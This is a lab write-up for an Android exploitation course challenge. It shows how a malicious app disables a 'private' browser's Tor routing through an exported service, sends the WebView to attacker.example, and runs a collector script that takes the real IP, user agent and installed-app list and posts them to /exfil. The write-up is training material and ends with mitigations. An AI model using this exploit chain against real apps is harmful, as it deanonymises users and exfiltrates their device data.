# DroidView — Ultimate Private Browsing Solution

> **Course:** [Android Application Exploitation Challenges](https://academy.8ksec.io/course/android-application-exploitation-challenges)
> **Focus:** WebView exploitation · service/IPC abuse · data exfiltration
> Android 15 · no root · no runtime permissions

## Goal

A "private" browser routes traffic through **Tor**, with a token-based
mechanism to disable routing. Build a malicious app that silently:
1. kills the Tor routing,
2. redirects the victim to an attacker site,
3. exfiltrates their **real IP**, device info, and installed app list —
all through the browser's own WebView.

## Solution

### 1 — Map the attack surface (JADX)

- Find the **Tor management component** (service/receiver) that accepts the
  "stop routing" command — note its `token` validation.
- Find the **token source**: the token is typically generated by the app and
  stored retrievable via IPC (or it accepts a statically known value).
- Find the WebView entry point (activity/action accepting a URL).

### 2 — Malicious app (no permissions needed)

```java
// 1) stop Tor via the exported component (token obtained via IPC query
//    from the running service, or the app's static fallback token)
Intent stop = new Intent("com.droidview.STOP_TOR");
stop.setClassName("com.droidview", "com.droidview.TorControllerService");
stop.putExtra("token", capturedToken);
startService(stop);

// 2) drive the victim's WebView to the attacker collector
Intent view = new Intent(Intent.ACTION_VIEW,
        Uri.parse("droidview://open?url=https://attacker.example/collect"));
view.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(view);
```

### 3 — The collector page (attacker server)

```html
<script>
  // real IP = direct connection (Tor is dead)
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(ip => {
      const info = {
        ip: ip.ip,
        ua: navigator.userAgent,           // device info
        screen: screen.width + 'x' + screen.height
      };
      navigator.sendBeacon('/exfil', JSON.stringify(info));
    });
</script>
```

4. Installed-app list: the browser's JS bridge exposes
   `getInstalledApps()`-style handlers (see `addJavascriptInterface` in
   JADX) — call it from the same page via the bridge name found in the
   dump.

5. The exfil endpoint receives: real IP + UA + installed packages —
   lab solved.

## Mitigation

Require a user-presented token (not IPC-retrievable), sign IPC intents, and
never expose device-inventory APIs to a WebView bridge.
